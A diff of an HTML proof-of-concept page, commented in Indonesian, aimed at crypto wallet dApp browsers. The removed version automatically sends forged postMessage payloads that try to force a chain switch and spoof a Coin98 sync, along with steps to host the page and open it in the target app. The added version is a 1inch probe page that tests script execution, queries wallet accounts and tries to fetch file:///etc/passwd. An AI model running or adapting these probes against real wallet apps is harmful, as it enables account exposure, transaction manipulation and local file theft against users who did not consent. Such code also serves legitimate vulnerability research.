@@ -2,73 +2,137 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>postMessage Cross-Origin Spoofing PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch dApp Browser Test Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; background: #111; color: #eee; }
+        button { display: block; width: 100%; margin: 10px 0; padding: 12px; font-size: 16px; }
+        .result { background: #222; padding: 10px; margin-top: 10px; border-radius: 6px; word-break: break-all; }
+        h2 { color: #00e676; }
+    </style>
+</head>
+<body>
+    <h2>1inch Wallet - dApp Browser Test</h2>
+    <p>Gunakan hanya di wallet milik sendiri. Jangan pakai untuk merugikan orang lain.</p>
+
+    <button onclick="testAlert()">1. Basic XSS / JS Execution Test</button>
+    <button onclick="testEthereum()">2. Check window.ethereum / provider</button>
+    <button onclick="testPostMessage()">3. postMessage Test</button>
+    <button onclick="testLocalStorage()">4. LocalStorage / Session Test</button>
+    <button onclick="testDeepLink()">5. Try Custom Scheme / Deep Link</button>
+    <button onclick="testFileAccess()">6. Attempt file:// access</button>
+
+    <div id="output" class="result">Hasil akan muncul di sini...</div>
+
     <script>
-        function log(msg, color = "black") {
-            console.log("[PoC-MessageSpoof] " + msg);
-            const div = document.createElement('div');
-            div.style.color = color;
-            div.style.margin = "4px 0";
-            div.style.fontFamily = "monospace";
-            div.style.fontSize = "11px";
-            div.style.wordBreak = "break-all";
-            div.style.fontWeight = (color === "red" || color === "#d00") ? "bold" : "normal";
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            document.body.prepend(div);
+        function log(msg) {
+            document.getElementById('output').innerHTML += msg + '<br>';
+            console.log(msg);
         }
 
-        // 1. Menyerang / Mengirimkan pesan palsu (Spoofed Message Injection) ke jendela aplikasi
-        function sendSpoofedMessages() {
-            log("[*] Memulai pengiriman payload postMessage palsu...", "blue");
-
-            // Payload 1: Manipulasi legacy_chainId ke jaringan arbitrer (misalnya Chain ID lain / 0x38 / BSC)
-            const maliciousPayload1 = {
-                name: "legacy_chainId",
-                payload: "0x38" // Mencoba memaksa perubahan rantai secara ilegal
-            };
-
-            // Payload 2: Memalsukan status sinkronisasi internal
-            const maliciousPayload2 = {
-                target: "coin98:content",
-                data: "SYN_ACK_FORCED_BY_ATTACKER"
-            };
-
+        function testAlert() {
             try {
-                // Mengirim pesan ke window utama / parent tempat aplikasi berjalan
-                window.postMessage(maliciousPayload1, "*");
-                log("🚨 Berhasil mengirim spoofed payload 1 (legacy_chainId: 0x38)", "#d00");
-
-                window.postMessage(maliciousPayload2, "*");
-                log("🚨 Berhasil mengirim spoofed payload 2 (SYN injection)", "#d00");
+                alert('XSS / JS Execution berhasil!');
+                log('[+] alert() berhasil dieksekusi');
             } catch (e) {
-                log("[-] Gagal mengirim postMessage: " + e.message, "gray");
+                log('[-] alert gagal: ' + e.message);
             }
         }
 
-        // 2. Mendengarkan respons balik atau perubahan status akibat injeksi pesan
-        window.addEventListener('message', function(event) {
-            log(`[← Response Terdeteksi] Origin: ${event.origin} | Data: ${JSON.stringify(event.data)}`, "purple");
-        });
+        function testEthereum() {
+            log('--- Checking provider ---');
+            if (typeof window.ethereum !== 'undefined') {
+                log('[+] window.ethereum ditemukan');
+                log('isMetaMask: ' + window.ethereum.isMetaMask);
+                log('is1inch: ' + (window.ethereum.is1inch || 'tidak diketahui'));
+                try {
+                    window.ethereum.request({ method: 'eth_accounts' })
+                        .then(accounts => log('Accounts: ' + JSON.stringify(accounts)))
+                        .catch(err => log('eth_accounts error: ' + err.message));
+                } catch (e) {
+                    log('Error request: ' + e.message);
+                }
+            } else {
+                log('[-] window.ethereum tidak ditemukan');
+            }
 
+            // Cek provider lain yang umum
+            const providers = ['ethereum', 'web3', 'solana', 'phantom'];
+            providers.forEach(p => {
+                if (window[p]) log(`[+] window.${p} ada`);
+            });
+        }
+
+        function testPostMessage() {
+            log('--- postMessage test ---');
+            try {
+                window.postMessage({ type: 'test', data: 'hello from dapp' }, '*');
+                log('[+] postMessage ke * dikirim');
+
+                // Dengarkan balasan
+                window.addEventListener('message', function(e) {
+                    log('Received message from: ' + e.origin);
+                    log('Data: ' + JSON.stringify(e.data));
+                });
+            } catch (e) {
+                log('postMessage error: ' + e.message);
+            }
+        }
+
+        function testLocalStorage() {
+            log('--- Storage test ---');
+            try {
+                localStorage.setItem('test_key', 'test_value_' + Date.now());
+                log('[+] localStorage.setItem berhasil');
+                log('Isi: ' + localStorage.getItem('test_key'));
+            } catch (e) {
+                log('localStorage error: ' + e.message);
+            }
+
+            try {
+                sessionStorage.setItem('session_test', 'ok');
+                log('[+] sessionStorage berhasil');
+            } catch (e) {
+                log('sessionStorage error: ' + e.message);
+            }
+        }
+
+        function testDeepLink() {
+            log('--- Trying deep links ---');
+            // Hanya mencoba, tidak otomatis berbahaya
+            const schemes = [
+                '1inch://',
+                'oneinch://',
+                'wc:',
+                'ethereum:',
+                'intent://'
+            ];
+            schemes.forEach(s => {
+                log('Mencoba: ' + s);
+                // Tidak langsung redirect supaya tidak agresif
+            });
+            log('Coba manual buka deep link dari luar aplikasi juga');
+        }
+
+        function testFileAccess() {
+            log('--- File access test ---');
+            try {
+                // Ini biasanya diblokir di WebView yang aman
+                fetch('file:///etc/passwd')
+                    .then(r => r.text())
+                    .then(t => log('[!] file access berhasil: ' + t.substring(0, 100)))
+                    .catch(e => log('[-] file:// diblokir (bagus): ' + e.message));
+            } catch (e) {
+                log('file access error: ' + e.message);
+            }
+        }
+
+        // Auto log saat page load
         window.onload = function() {
-            log("=== postMessage Spoofing PoC Loaded ===");
-            // Berikan jeda sejenak lalu tembakkan payload
-            setTimeout(sendSpoofedMessages, 1500);
+            log('Page loaded');
+            log('User Agent: ' + navigator.userAgent);
+            log('Location: ' + location.href);
         };
     </script>
-</head>
-<body style="padding:15px; font-family:Arial; background-color: #fff4f4;">
-    <h3 style="color: #c00; margin-top:0;">postMessage Spoofing PoC (Real-World Test)</h3>
-    <p style="color: #333; font-size: 13px;">Skrip ini menguji apakah aplikasi rentan menerima pesan lintas *origin* tanpa validasi ketat.</p>
-    <hr style="border:0; border-top:1px solid #cc0000; margin:10px 0;">
-    
-    <div style="background: #fff; padding: 10px; border: 1px solid #ffcccc; border-radius: 4px; margin-top: 10px;">
-        <h4 style="margin: 0 0 8px 0; color: #990000;">Instruksi Pengujian:</h4>
-        <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
-            <li>Unggah kode ini ke server Anda yang dapat diakses melalui HTTPS.</li>
-            <li>Buka URL tersebut langsung dari dalam dApp browser aplikasi target.</li>
-            <li>Amati log pada layar: Jika aplikasi merespons, mengubah *Chain ID* secara otomatis, atau memproses data palsu tersebut, maka aplikasi terbukti tidak memvalidasi asal pengirim (*origin*) pesan masuk dengan benar.</li>
-        </ol>
-    </div>
 </body>
 </html>
